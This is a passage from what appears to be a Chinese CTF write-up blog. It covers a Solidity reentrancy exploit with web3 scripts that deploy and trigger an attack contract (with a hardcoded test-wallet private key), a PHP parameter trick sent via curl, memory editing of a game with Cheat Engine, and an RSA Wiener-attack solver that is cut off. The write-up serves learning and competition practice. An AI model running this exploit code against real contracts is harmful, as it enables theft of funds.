class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进行交易</span></span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到 RPC 地址</span></span><br><span class="line">rpc_url = <span class="string">&quot;http://119.8.106.225:8546&quot;</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(rpc_url))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 你的测试钱包地址和私钥</span></span><br><span class="line">eth_address = <span class="string">&quot;0x9ca6A53A9b47C04dcbca625d55980D46a97Eef70&quot;</span></span><br><span class="line">private_key = <span class="string">&quot;d78192d532e5a3bde6a8bfbae6ff7f302c318a1e76a35d1bb4d7c2199cd79843&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标部署账户（deployer account）</span></span><br><span class="line">deployer_address = <span class="string">&quot;0x03CB80078a336E2e08fF48C3036Fa3FC2d7B3e2d&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取链 ID</span></span><br><span class="line">chain_id = w3.eth.chain_id</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建交易</span></span><br><span class="line">tx = &#123;</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: w3.eth.get_transaction_count(eth_address),</span><br><span class="line">    <span class="string">&#x27;to&#x27;</span>: deployer_address,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: w3.to_wei(<span class="number">0.001</span>, <span class="string">&#x27;ether&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">25000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: w3.to_wei(<span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: chain_id  <span class="comment"># 添加链 ID</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用私钥签名交易</span></span><br><span class="line">signed_tx = w3.eth.account.sign_transaction(tx, private_key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送交易</span></span><br><span class="line">tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;交易已发送，交易哈希: <span class="subst">&#123;w3.to_hex(tx_hash)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待交易确认</span></span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_hash)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;交易成功！交易哈希: <span class="subst">&#123;w3.to_hex(tx_hash)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></li>
<li>查看合约码<br>发现withdraw 函数中存在<strong>重入攻击漏洞</strong><br>通过递归调用 withdraw 函数，反复提取资金，直到余额变为负数，并超过 1000 Ether 的检查条件，从而解锁 isSolved 状态，获取 flag。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/doraemonblogs/themes/butterfly/source/img/CTF/inject.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/doraemonblogs/themes/butterfly/source/img/CTF/inject-1.png"><br>最后在命令行返回flag</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到目标链的 RPC 地址</span></span><br><span class="line">rpc_url = <span class="string">&quot;http://119.8.106.225:8546&quot;</span>  <span class="comment"># 区块链节点的 RPC 地址</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(rpc_url))  <span class="comment"># 创建 Web3 实例</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查与区块链节点的连接状态</span></span><br><span class="line"><span class="keyword">if</span> w3.is_connected():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;成功连接到区块链节点&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;无法连接到区块链节点&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置用户账户地址和私钥</span></span><br><span class="line">user_address = <span class="string">&quot;0x9ca6A53A9b47C04dcbca625d55980D46a97Eef70&quot;</span>  <span class="comment"># 账户地址</span></span><br><span class="line">user_private_key = <span class="string">&quot;d78192d532e5a3bde6a8bfbae6ff7f302c318a1e76a35d1bb4d7c2199cd79843&quot;</span>  <span class="comment"># 账户私钥</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标合约的地址</span></span><br><span class="line">target_contract_address = <span class="string">&quot;0x36b1967D9F64A492C60D82823B2562206d4a0D06&quot;</span>  <span class="comment"># 目标合约地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 攻击合约的 ABI</span></span><br><span class="line">attack_contract_abi = [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;inputs&quot;</span>: [&#123;<span class="string">&quot;internalType&quot;</span>: <span class="string">&quot;address&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;_vulnerableAddress&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;address&quot;</span>&#125;],</span><br><span class="line">        <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;nonpayable&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;constructor&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;<span class="string">&quot;inputs&quot;</span>: [], <span class="string">&quot;name&quot;</span>: <span class="string">&quot;attack&quot;</span>, <span class="string">&quot;outputs&quot;</span>: [], <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;payable&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;inputs&quot;</span>: [], <span class="string">&quot;name&quot;</span>: <span class="string">&quot;owner&quot;</span>, <span class="string">&quot;outputs&quot;</span>: [&#123;<span class="string">&quot;internalType&quot;</span>: <span class="string">&quot;address&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;address&quot;</span>&#125;], <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;view&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;inputs&quot;</span>: [], <span class="string">&quot;name&quot;</span>: <span class="string">&quot;vulnerable&quot;</span>, <span class="string">&quot;outputs&quot;</span>: [&#123;<span class="string">&quot;internalType&quot;</span>: <span class="string">&quot;contract IVulnerable&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;address&quot;</span>&#125;], <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;view&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;inputs&quot;</span>: [], <span class="string">&quot;name&quot;</span>: <span class="string">&quot;withdrawFunds&quot;</span>, <span class="string">&quot;outputs&quot;</span>: [], <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;nonpayable&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;payable&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;receive&quot;</span>&#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 攻击合约的字节码（由 Solidity 编译器生成）</span></span><br><span class="line">attack_contract_bytecode = <span class="string">&quot;6080604052600436106100595760003560e01c806327e235e3146100655780632e1a7d4d146100aa57806364d98f6e146100d65780638da5cb5b146100ff57806393aef87114610130578063b6b55f251461014557610060565b3661006057005b600080fd5b34801561007157600080fd5b506100986004803603602081101561008857600080fd5b50356001600160a01b031661016f565b60408051918252519081900360200190f35b3480156100b657600080fd5b506100d4600480360360208110156100cd57600080fd5b5035610181565b005b3480156100e257600080fd5b506100eb61021b565b604080519115158252519081900360200190f35b34801561010b57600080fd5b5061011461022b565b604080516001600160a01b039092168252519081900360200190f35b34801561013c57600080fd5b506100d461023a565b34801561015157600080fd5b506100d46004803603602081101561016857600080fd5b5035610270565b60006020819052908152604090205481565b336000908152602081905260409020548111156101d4576040805162461bcd60e51b815260206004820152600c60248201526be4bd99e9a29de4b88de8b6b360a01b604482015290519081900360640190fd5b604051339082156108fc029083906000818181858888f19350505050158015610201573d6000803e3d6000fd5b503360009081526020819052604090208054919091039055565b600154600160a01b900460ff1681565b6001546001600160a01b031681565b33600090815260208190526040902054683635c9adc5dea00000101561026e576001805460ff60a01b1916600160a01b1790555b565b3360009081526020819052604090208054909101905556fea2646970667358221220c0b48d8f73c81a21de90501da0815e6b9d921851377155170123a89c550ad10e64736f6c634300060c0033&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标合约的 ABI（用于检查是否成功解决挑战）</span></span><br><span class="line">target_contract_abi = [</span><br><span class="line">    &#123;<span class="string">&quot;inputs&quot;</span>: [], <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;nonpayable&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;constructor&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;inputs&quot;</span>: [], <span class="string">&quot;name&quot;</span>: <span class="string">&quot;isSolved&quot;</span>, <span class="string">&quot;outputs&quot;</span>: [&#123;<span class="string">&quot;internalType&quot;</span>: <span class="string">&quot;bool&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;bool&quot;</span>&#125;], <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;view&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;inputs&quot;</span>: [&#123;<span class="string">&quot;internalType&quot;</span>: <span class="string">&quot;uint256&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;_amount&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;uint256&quot;</span>&#125;], <span class="string">&quot;name&quot;</span>: <span class="string">&quot;deposit&quot;</span>, <span class="string">&quot;outputs&quot;</span>: [], <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;nonpayable&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;inputs&quot;</span>: [&#123;<span class="string">&quot;internalType&quot;</span>: <span class="string">&quot;uint256&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;_amount&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;uint256&quot;</span>&#125;], <span class="string">&quot;name&quot;</span>: <span class="string">&quot;withdraw&quot;</span>, <span class="string">&quot;outputs&quot;</span>: [], <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;nonpayable&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;payable&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;receive&quot;</span>&#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 部署攻击合约</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;正在部署攻击合约...&quot;</span>)</span><br><span class="line">Attack = w3.eth.contract(abi=attack_contract_abi, bytecode=attack_contract_bytecode)</span><br><span class="line">tx = Attack.constructor(target_contract_address).build_transaction(&#123;</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: <span class="number">38142</span>,  <span class="comment"># 链ID</span></span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">2000000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: w3.to_wei(<span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: w3.eth.get_transaction_count(user_address),</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: user_address</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用私钥签名并发送交易</span></span><br><span class="line">signed_tx = w3.eth.account.sign_transaction(tx, user_private_key)</span><br><span class="line">tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待合约部署完成</span></span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_hash)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;攻击合约部署成功，合约地址: <span class="subst">&#123;receipt.contractAddress&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用部署的攻击合约地址实例化合约</span></span><br><span class="line">attack_contract = w3.eth.contract(address=receipt.contractAddress, abi=attack_contract_abi)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用攻击合约的 attack 函数发起攻击</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;正在发起攻击...&quot;</span>)</span><br><span class="line">tx = attack_contract.functions.attack().build_transaction(&#123;</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: <span class="number">38142</span>,  <span class="comment"># 链ID</span></span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">2000000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: w3.to_wei(<span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: w3.eth.get_transaction_count(user_address),</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: user_address,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: w3.to_wei(<span class="number">1</span>, <span class="string">&#x27;ether&#x27;</span>)  <span class="comment"># 发送1 Ether</span></span><br><span class="line">&#125;)</span><br><span class="line">signed_tx = w3.eth.account.sign_transaction(tx, user_private_key)</span><br><span class="line">tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查目标合约是否解决了挑战</span></span><br><span class="line">target_contract = w3.eth.contract(address=target_contract_address, abi=target_contract_abi)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用 isSolved 函数检查挑战状态</span></span><br><span class="line">is_solved = target_contract.functions.isSolved().call()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;挑战是否已解决: <span class="subst">&#123;is_solved&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><p>由题意得，flag被切分为两段，前一段要求传入参数为L3HSEC,即可返回前半部分flag,后一段要求传入参数为’我是大牛’,且每次传参字符串的长度不得大于1，才会返回后半部分flag<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTF/php-1.png"></p>
<p>对于前半段考察变量和变量名的知识，在cmd中输入</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://f4721935-<span class="number">26</span>b6-<span class="number">414</span>f-<span class="number">9</span>a62-<span class="number">791</span>cda2b3c30.ctf.l3hsec.com/challenge.php -d &quot;_=a&amp;a=b&amp;b=L3HSEC</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTF/php-2.png"><br>对于后半段考察php中字符串拼接问题，一个中文字符通过URL编码后转换为3个UTF-8编码的字符，将’我是大牛’通过URL编码后，再一个字节一个字节地传递参数，php自动拼接后形成’我是大牛’,巧妙解决了字符串长度不大于1的问题<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTF/php-3.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTF/php-4.png"><br>前后拼接后成功得到flag</p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="听说你是pvz高手"><a href="#听说你是pvz高手" class="headerlink" title="听说你是pvz高手"></a>听说你是pvz高手</h3><p>题目要求收集10000阳光即可获得flag<br>使用 <strong>Cheat Engine (CEx修改器)</strong> 找到程序进程，再尝试扫描当前的阳光数，找到阳光所占有的内存，通过修改内存中阳光数，成功得到flag<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTF/pvz-1.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTF/pvz-2.png"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="big-math"><a href="#big-math" class="headerlink" title="big_math"></a>big_math</h3><blockquote>
<p>RSA加密是一种<strong>非对称加密算法</strong><br>RSA加密使用一对密钥：<strong>公钥</strong>和<strong>私钥</strong>。公钥用于加密，私钥用于解密<br>RSA的安全性基于大数分解的困难性，尤其是大素数乘积的分解问题</p>
</blockquote>
<p><strong>RSA加密的基本原理</strong></p>
<ol>
<li>密钥生成<br>为了生成 RSA 密钥，需要进行以下步骤：</li>
</ol>
<ul>
<li><strong>选择两个大素数 (p) 和 (q)：</strong></li>
<li><strong>计算模数 (n)：</strong><br>[<br>n &#x3D; p \times q<br>]<br>模数 (n) 是 RSA 公钥和私钥的核心部分，用于加密和解密。</li>
<li><strong>计算欧拉函数 (\phi(n))：</strong><br>欧拉函数 (\phi(n)) 是在模 (n) 下的可逆整数个数，对于两个素数 (p) 和 (q)，欧拉函数的值为：<br>[<br>\phi(n) &#x3D; (p-1) \times (q-1)<br>]</li>
<li><strong>选择公钥指数 (e)：</strong><br>选择一个整数 (e)，使得 (1 &lt; e &lt; \phi(n))，并且 (e) 与 (\phi(n)) 互质（即 (\gcd(e, \phi(n)) &#x3D; 1)）</li>
<li><strong>计算私钥指数 (d)：</strong><br>私钥指数 (d) 是 (e) 在模 (\phi(n)) 下的逆元，即：<br>[<br>e \cdot d \equiv 1 \ (\text{mod} \ \phi(n))<br>]<br>这个 (d) 通过扩展欧几里得算法计算得到。</li>
</ul>
<ol start="2">
<li><p>加密过程<br>加密过程使用公钥进行。假设需要加密的消息为 (m)（消息 (m) 是一个整数，且 (0 \leq m &lt; n)），加密公式为：<br>[<br>c &#x3D; m^e \ (\text{mod} \ n)<br>]<br>其中，(c) 是加密后的密文。</p>
</li>
<li><p>解密过程<br>解密过程使用私钥进行。解密时，使用加密得到的密文 (c) 通过私钥进行解密，公式为：<br>[<br>m &#x3D; c^d \ (\text{mod} \ n)<br>]<br>解密后得到的 (m) 就是原始消息。</p>
</li>
</ol>
<p>Wiener攻击（Wiener’s Attack）是一种针对RSA加密的攻击方法，专门用于破解当RSA私钥 ( d ) 过小的情况。该攻击由密码学家Michael Wiener在1990年提出。它利用了当私钥 ( d ) 较小时，RSA系统的弱点，能够通过特定的数学技术推导出私钥。</p>
<p><strong>Wiener攻击基本原理</strong><br>Wiener攻击基于连分数逼近理论。攻击的关键是，当私钥 ( d ) 较小时， ( d ) 和 ( e ) 的比值 ( \frac{d}{n} ) 可以通过连分数逼近的方式很好地近似。通过这一逼近，攻击者可以构造一系列候选的私钥，并验证哪个候选私钥能够破解密文。</p>
<p><strong>分析题意</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">m1=bytes_to_long(flag1)</span><br><span class="line">m2=bytes_to_long(flag2)</span><br><span class="line">p=getPrime(1024)</span><br><span class="line">q=getPrime(1024)</span><br><span class="line">r=getPrime(2048)</span><br><span class="line">t=getPrime(2048)</span><br><span class="line">little_n=p*q</span><br><span class="line">n=p*q*r</span><br></pre></td></tr></table></figure>
<p>m1,m2是由flag1和flag2通过bytes_to_long()函数转换成的两个整数<br>p,q是长度为1024的素数,r,t是长度为2048的素数<br>little_n和n是模数<br><strong>解题思路</strong><br>利用<strong>Wiener攻击</strong>破解RSA私钥，在 RSA 私钥 d 较小的情况设计的攻击<br>代码核心是通过<strong>连分数逼近</strong>的方法，从公钥指数 e 和模数 n 推导出私钥 d</p>
<p>（说实话，该工作主要是由gpt完成，具体核心算法不太了解，不过通过本题对RSA加密方式的了解更深入了）</p>
<p><strong>python程序</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">little_n = <span class="number">30088545050765530423805361878416507393996570826628516885551767012032821735759756922346729483075999478740890396740180776286577993631294405655843348355472462014506667147244720307627201462475792283412817218766998118873677473067104176849657311706442634062420091828926853184205920237951862265182484069649756691839691357916405847978176837008745046642748094275030779471750959877986668422253281400626795828963573920393088749591612716695564149666681604429837724976821672947402732999481879540771777938480505225596566416091698577609111167970146033914320439938709937337918464176949019458189405542377412201071336990086704695932001</span></span><br><span class="line">ciphertext_1 = <span class="number">4437957888497793411974936231134804097124408727940101262533154501417200692919579880947962548717550593697567354996004074082892093231542300979099686519594863569977498876831765076396347598926115862183073685024990864689988238858428295897918744431202362320291015738417428855920053052479809273411609887264443586795095964728239991625582152693909500018661918195404034412467186049173913167545009955896623699305090180468870302233714242619856378640191118517945701566010541415167017293158989288295521065448608130916732093398678710697626416830318362328907904233236575731454083519911431098911284149955444519573629006045554678324518</span></span><br><span class="line">ciphertext_2 = <span class="number">78864561424890770405754552496508735565097767299975292698696817263059870704574252767244750339849821607143039860304278377928922953654619860402709334687968551656512266903178248270944553116215521323821491311662555239829301305000772651190496470417476770564428704238037095240110347750439779101856099345785742200533953669469298415538894433163090058251625858567316364473944123076299230135880825507857770277939412860689895530498381163283821263531273538955506316194191926213707241352871080646562627012054391523644091891727237326335520749063659993188231648389392672191093964160488575369753007731166404854380331830984470657441644838342607582333391874996621339432497442777200974041109474972662502438556188363293907320120566021040878727616875785724243592701260771353665329454661067014678384002070808151070358872996829354884423078897260496009237360165626015366112230594958895261737530922455844000526883743056291880281170954068780564714657040355762723448235762641056698958446508680666476759259974921224980623537386361094690459034558856950725634724109009764690331916406889225273702793795808581259336656477575737512000567280203588771895736081353710119074573273205809318278896389561023955187406736051571629668238556317874245476690747300656637355328544</span></span><br><span class="line">ciphertext_3 = <span class="number">5725077557808157256430942740990569460773383369554273823636176153068467454512823763515647291612402009313693931982637385545689576303886538569510933702499950531946332354820616178601187839652301529137964554627475349002312246937622569844740649433856363144796146222393078023525987286341880380785409632776930595126924756112630243882589976085512471897027381156120513087172923236464367405811882805821186710490261430865849118334490795875278968965387483397523573061251371457251882441660955274348488917840958718541709618303915977686144557627966423963471317515192738334921562091927856956424998965161634322201369720699676347561471675582403160973419462033935866447730620497674055205496875933173254400413581110627294132729326146351739721506814065623387296595138287209163676622201909074010014848172929614143034759743549710300854100952625823552353762197591658982169029599443577415788436359487959114564852534141669094849830099267923384043803436255468847172967932193132489983957589359087823645662055626662973824314495580206380101750792194329854822007590502007055850504474332004464704128354176720739742561430179525179333961608814112175164504198485752771156978208909885458371099313162881602617458059925830364899254441195137785150763268195094621953852200244632416635894291988860065011405757906072849175293480722258929900953859011925277272123913190894980729598985883765586084558378588241413809751317207241875249125287708228797477309231958728561077734778094562357805705275014499804452986728418351199125822789541623527033144636672210156626415595121581925193962797953221837338303410442520344309906567427785930338516724325132154448559539663325603906087819156754108336818594141014769273579814708171319748396233538472420596261105167186637071032111004322390242211983548088973696618482839305923027150374824593812983183773570950561602855654815750454908029219010408866049545122018834</span></span><br><span class="line">public_exponent = <span class="number">18811481222974302204632511369245433479738399576579288811947420564734925886156221373212611102729084374352339031631477899927769759235983596706326584303784559234972552599160858292029188896706945893473255912259624043253888044638166631707857526128138005829891524522002058110222521260201712077964922139704733672451062605244217266782627035293603650126728378938935853574071346654704141663803944530862726643221123184041746714755826882612203166391535425991832801305277555128091105172486311970004713359202828725505765900730826393253715700856299795299501353800751272345390463568402242244426464603165067636889617647460596431388673</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Rename the variables for clarity</span></span><br><span class="line">n = little_n</span><br><span class="line">c = ciphertext_1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to convert a rational number x/y to a continued fraction</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rational_to_contfrac</span>(<span class="params">x, y</span>):</span><br><span class="line">    a = x // y</span><br><span class="line">    pquotients = 